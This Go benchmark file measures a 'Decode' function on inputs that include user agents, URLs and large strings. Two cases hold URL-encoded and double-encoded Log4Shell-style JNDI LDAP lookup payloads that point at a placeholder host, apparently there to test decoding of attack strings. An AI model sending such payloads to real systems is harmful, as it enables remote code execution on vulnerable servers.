package engine

import (
	"strings"
	"testing"
)

func BenchmarkDecode(b *testing.B) {
	cases := []struct {
		name  string
		input string
	}{
		{"typical-user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"},
		{"typical-url", "/api/v1/items?id=42&sort=asc&filter=name%20contains%20widget"},
		{"encoded-payload", "%24%7Bjndi:ldap://x.invalid/a%7D"},
		{"double-encoded-payload", "%2524%257Bjndi:ldap://x.invalid/a%257D"},
		{"1MiB-plain", strings.Repeat("abcdefgh", 1<<17)},
		{"640KiB-percent-heavy", strings.Repeat("%20ab", 1<<17)},
	}
	for _, tc := range cases {
		b.Run(tc.name, func(b *testing.B) {
			b.SetBytes(int64(len(tc.input)))
			b.ReportAllocs()
			for b.Loop() {
				_ = Decode(tc.input, Limits{})
			}
		})
	}
}
